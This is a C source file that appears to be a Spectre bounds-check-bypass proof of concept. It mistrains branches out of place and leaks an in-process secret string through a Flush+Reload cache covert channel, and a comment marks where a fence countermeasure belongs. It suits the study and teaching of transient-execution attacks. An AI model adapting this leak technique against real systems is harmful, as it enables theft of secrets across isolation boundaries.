#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../../../libcache/cacheutils.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "INACCESSIBLE SECRET"

#define likely(x)       __builtin_expect((x),1)
#define unlikely(x)     __builtin_expect((x),0)

#define DATA_SECRET DATA SECRET

unsigned char data[128];

char access_array(int x) {
  // flushing the data which is used in the condition increases
  // probability of speculation
  size_t len = sizeof(DATA) - 1;
  mfence();
  flush(&len);
  flush(&x);
  
  // ensure data is flushed at this point
  mfence();

  // check that only accessible part (DATA) can be accessed
  if(unlikely((float)x / (float)len < 1)) {
    // countermeasure: add the fence here
    // Encode data in cache
    cache_encode(data[x]);
  }
}

volatile int true = 1;

// Span large part of memory with jump if equal
#if defined(__i386__) || defined(__x86_64__)
#define JE asm volatile("je end");
#elif defined(__aarch64__)
#define JE asm volatile("beq end");
#endif
#define JE_16 JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE
#define JE_256 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16
#define JE_4K JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256
#define JE_64K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K

void oop() {
#if defined(__i386__) || defined(__x86_64__)
  if(!true) true++;
#elif defined(__aarch64__)
	if(true) true++;
#endif
  JE_64K

end:
  return;
}

int main(int argc, const char **argv) {
  pagesize = sysconf(_SC_PAGESIZE);
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize - 1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  // store secret
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  // ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';

  // flush everything
  flush_shared_memory();

  // nothing leaked so far
  char leaked[sizeof(DATA_SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(DATA_SECRET)] = 0;

  int j = 0;
  while(1) {
    // for every byte in the string
    j = (j + 1) % sizeof(DATA_SECRET);

    // mistrain out of place
    for(int y = 0; y < 100; y++) {
        oop();
    }

    // only show inaccessible values (SECRET)
    if(j >= sizeof(DATA) - 1) {
      mfence(); // avoid speculation
      // out of bounds access
      access_array(j);
      // Recover data from covert channel
      cache_decode_pretty(leaked, j);
    }

    if(!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1))
      break;

    sched_yield();
  }
  printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");

  return 0;
}
